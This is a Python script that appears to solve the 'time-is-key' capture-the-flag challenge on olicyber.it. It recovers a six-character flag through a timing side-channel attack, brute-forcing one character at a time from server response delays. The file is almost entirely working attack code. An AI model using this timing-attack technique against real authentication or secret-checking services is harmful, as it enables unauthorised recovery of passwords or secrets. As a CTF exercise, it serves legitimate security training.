import requests
import time as t
url = "http://time-is-key.challs.olicyber.it/index.php"


flag_length = 6

dictionary = "abcdefghijklmnopqrstuvwxyz0123456789"


def execute(flag_value):
    data = {
        "flag" : flag_value
    }
    response = requests.post(url, data=data)
    return response

tries = 20
times = []

for i in range(20):
    start_time = t.time_ns()
    response = execute("helllo") # To generalize
    end_time = t.time_ns()
    time = end_time - start_time
    times.append(time)
    print(time)

avg_time_ns = sum(times) / tries
avg_time_s = avg_time_ns / 1_000_000_000
avg_time = f'{avg_time_ns} ns ({avg_time_s} s)'
print(f'Average time: {avg_time}')

base_delay = 1

threshold_s = base_delay/2

print(f"Using Threshold {threshold_s}s")

result = ""
attempts = 0
length = 1

found_char_flag = True
while found_char_flag:
    found_char_flag = False
    if attempts == len(dictionary):
        length += 1
        attempts = 0
    for c in dictionary:
        attempted_result = result+c
        #We need to reach length of 6, fill with something
        to_fill = 6 - len(attempted_result)
        for i in range(to_fill):
            attempted_result += 'a'
        start_time = t.time_ns()
        response = execute(attempted_result)
        end_time = t.time_ns()
        time = end_time - start_time
        time_s = time/1_000_000_000
        print(f"Tried {attempted_result} in {time_s}")
        length_aware_threshold = (base_delay*(len(result)+1))
        print(f"LAT: {length_aware_threshold}")
        if time_s >= length_aware_threshold:
            result +=c
            found_char_flag = True
            print(result)
            break
    attempts +=1

